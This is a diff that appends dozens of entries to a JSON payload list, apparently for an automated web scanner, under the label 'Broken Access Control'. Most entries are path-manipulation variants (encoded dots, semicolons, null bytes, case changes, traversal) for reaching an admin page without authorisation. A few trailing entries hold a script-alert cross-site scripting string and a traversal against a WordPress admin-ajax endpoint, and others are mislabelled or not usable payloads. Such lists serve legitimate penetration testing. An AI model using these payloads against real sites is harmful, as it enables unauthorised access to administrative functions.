@@ -12384,5 +12384,863 @@
       "expected_status_code": 200,
       "success_regex": ""
     }
+  },
+  {
+    "payload_id": "OWP-317946",
+    "vulnerability_category": "Broken Access Control",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "url.com/admin/?",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-317947",
+    "vulnerability_category": "Broken Access Control",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "url.com//admin//",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-317948",
+    "vulnerability_category": "Broken Access Control",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "url.com///admin///",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-317949",
+    "vulnerability_category": "Broken Access Control",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "url.com/./admin/./",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-317950",
+    "vulnerability_category": "Broken Access Control",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "url.com/admin?",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-317951",
+    "vulnerability_category": "Broken Access Control",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "url.com/admin??",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-317952",
+    "vulnerability_category": "Broken Access Control",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "url.com/admin/?/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-317953",
+    "vulnerability_category": "Broken Access Control",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "url.com/admin/??",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-317954",
+    "vulnerability_category": "Broken Access Control",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "url.com/admin/??/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-317955",
+    "vulnerability_category": "Broken Access Control",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "url.com/admin/..",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-317956",
+    "vulnerability_category": "Broken Access Control",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "url.com/admin/../",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-317957",
+    "vulnerability_category": "Broken Access Control",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "url.com/admin/./",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-317958",
+    "vulnerability_category": "Broken Access Control",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "url.com/admin/.",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-317959",
+    "vulnerability_category": "Broken Access Control",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "url.com/admin/.//",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-317960",
+    "vulnerability_category": "Broken Access Control",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "url.com/admin/*",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-317961",
+    "vulnerability_category": "Broken Access Control",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "url.com/admin//*",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-317962",
+    "vulnerability_category": "Broken Access Control",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "url.com/admin/%2f",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-317963",
+    "vulnerability_category": "Broken Access Control",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "url.com/admin/%2f/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-317964",
+    "vulnerability_category": "Broken Access Control",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "url.com/admin/%20",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-317965",
+    "vulnerability_category": "Broken Access Control",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "url.com/admin/%20/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-317966",
+    "vulnerability_category": "Broken Access Control",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "url.com/admin/%09",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-317967",
+    "vulnerability_category": "Broken Access Control",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "url.com/admin/%09/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-317968",
+    "vulnerability_category": "Broken Access Control",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "url.com/admin/%0a",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-317969",
+    "vulnerability_category": "Broken Access Control",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "url.com/admin/%0a/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-317970",
+    "vulnerability_category": "Broken Access Control",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "url.com/admin/%0d",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-317971",
+    "vulnerability_category": "Broken Access Control",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "url.com/admin/%0d/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-317972",
+    "vulnerability_category": "Broken Access Control",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "url.com/admin/%25",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-317973",
+    "vulnerability_category": "Broken Access Control",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "url.com/admin/%25/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-317974",
+    "vulnerability_category": "Broken Access Control",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "url.com/admin/%23",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-317975",
+    "vulnerability_category": "Broken Access Control",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "url.com/admin/%23/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-317976",
+    "vulnerability_category": "Broken Access Control",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "url.com/admin/%26",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-317977",
+    "vulnerability_category": "Broken Access Control",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "url.com/admin/%3f",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-317978",
+    "vulnerability_category": "Broken Access Control",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "url.com/admin/%3f/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-317979",
+    "vulnerability_category": "Broken Access Control",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "url.com/admin/%26/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-317980",
+    "vulnerability_category": "Broken Access Control",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "url.com/admin/#",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-317981",
+    "vulnerability_category": "Broken Access Control",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "url.com/admin/#/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-317982",
+    "vulnerability_category": "Broken Access Control",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "url.com/admin/#/./",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-317983",
+    "vulnerability_category": "Broken Access Control",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "url.com/./admin",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-317984",
+    "vulnerability_category": "Broken Access Control",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "url.com/./admin/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-317985",
+    "vulnerability_category": "Broken Access Control",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "url.com/..;/admin",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-317986",
+    "vulnerability_category": "Broken Access Control",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "url.com/..;/admin/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-317987",
+    "vulnerability_category": "Broken Access Control",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "url.com/.;/admin",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-317988",
+    "vulnerability_category": "Broken Access Control",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "url.com/.;/admin/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-317989",
+    "vulnerability_category": "Broken Access Control",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "url.com/;/admin",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-317990",
+    "vulnerability_category": "Broken Access Control",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "url.com/;/admin/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-317991",
+    "vulnerability_category": "Broken Access Control",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "url.com//;//admin",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-317992",
+    "vulnerability_category": "Broken Access Control",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "url.com//;//admin/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-317993",
+    "vulnerability_category": "Broken Access Control",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "url.com/%2e/admin",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-317994",
+    "vulnerability_category": "Broken Access Control",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "url.com/%2e/admin/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-317995",
+    "vulnerability_category": "Broken Access Control",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "url.com/%20/admin/%20",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-317996",
+    "vulnerability_category": "Broken Access Control",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "url.com/%20/admin/%20/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-317997",
+    "vulnerability_category": "Broken Access Control",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "url.com/admin/..;/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-317998",
+    "vulnerability_category": "Broken Access Control",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "url.com/admin.json",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-317999",
+    "vulnerability_category": "Broken Access Control",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "url.com/admin/.json",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-318000",
+    "vulnerability_category": "Broken Access Control",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "url.com/admin..;/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-318001",
+    "vulnerability_category": "Broken Access Control",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "url.com/admin;/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-318002",
+    "vulnerability_category": "Broken Access Control",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "url.com/admin%00",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-318003",
+    "vulnerability_category": "Broken Access Control",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "url.com/admin.css",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-318004",
+    "vulnerability_category": "Broken Access Control",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "url.com/admin.html",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-318005",
+    "vulnerability_category": "Broken Access Control",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "url.com/admin?id=1",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-318006",
+    "vulnerability_category": "Broken Access Control",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "url.com/admin~",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-318007",
+    "vulnerability_category": "Broken Access Control",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "url.com/admin/~",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-318008",
+    "vulnerability_category": "Broken Access Control",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "url.com/admin/°/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-318009",
+    "vulnerability_category": "Broken Access Control",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "url.com/admin/&",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-318010",
+    "vulnerability_category": "Broken Access Control",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "url.com/admin/-",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-318011",
+    "vulnerability_category": "Broken Access Control",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "url.com/admin\\/\\/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-318012",
+    "vulnerability_category": "Broken Access Control",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "url.com/admin/..%3B/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-318013",
+    "vulnerability_category": "Broken Access Control",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "url.com/admin/;%2f..%2f..%2f",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-318014",
+    "vulnerability_category": "Broken Access Control",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "url.com/ADMIN",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-318015",
+    "vulnerability_category": "Broken Access Control",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "url.com/ADMIN/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-318017",
+    "vulnerability_category": "Broken Access Control",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "url.com/*/admin",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-318018",
+    "vulnerability_category": "Broken Access Control",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "url.com/*/admin/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-318019",
+    "vulnerability_category": "Broken Access Control",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "url.com/ADM+IN",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-318020",
+    "vulnerability_category": "Broken Access Control",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "url.com/ADM+IN/",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-408156",
+    "vulnerability_category": "Broken Access Control",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "Pixelpost <= 1-5rc1-2 privilege escalation exploit\\r\\n",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-408265",
+    "vulnerability_category": "Broken Access Control",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "&#039;><script>alert(oink)</script>&csrf_token=>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-408329",
+    "vulnerability_category": "Broken Access Control",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "http://wp-csrf-new.test/wp-admin/admin-ajax.php?action=/../../../../../../index",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-408354",
+    "vulnerability_category": "Broken Access Control",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": ">CSRF</p>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
   }
 ]
